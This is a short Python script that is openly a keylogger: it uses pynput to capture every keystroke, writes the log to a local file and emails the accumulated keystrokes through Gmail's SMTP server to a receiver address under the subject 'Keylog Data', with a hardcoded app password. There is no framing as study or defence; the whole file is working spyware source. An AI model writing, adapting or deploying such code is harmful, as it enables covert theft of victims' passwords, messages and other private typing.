import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput.keyboard import Key, Listener

keys = []

sender_email = "email@example.com"
receiver_email = "email2@example.com"
email_password = "sydn sner lkmd kckf" #This is an app password set up from you e-mail provider 

def on_press(key):
    global keys
    keys.append(key)
    write_file(keys)

def write_file(keys):
    log = ""
    for key in keys:
        try:
            log += f"{key.char} "
        except AttributeError:
            if key == Key.space:
                log += " "
            elif key == Key.enter:
                log += "\n"
            else:
                log += f"[{key}] "
    

    with open("keylogmail.txt", "a") as f:
        f.write(log)
    
    send_email(log)

def send_email(log):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        
        server.login(sender_email, email_password)
        
        msg = MIMEMultipart()
        msg["From"] = sender_email
        msg["To"] = receiver_email
        msg["Subject"] = "Keylog Data"
        body = MIMEText(log, "plain")
        msg.attach(body)
        
        server.sendmail(sender_email, receiver_email, msg.as_string())
        server.quit()
        print("Email sent successfully")
    except Exception as e:
        print(f"Error sending email: {e}")

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

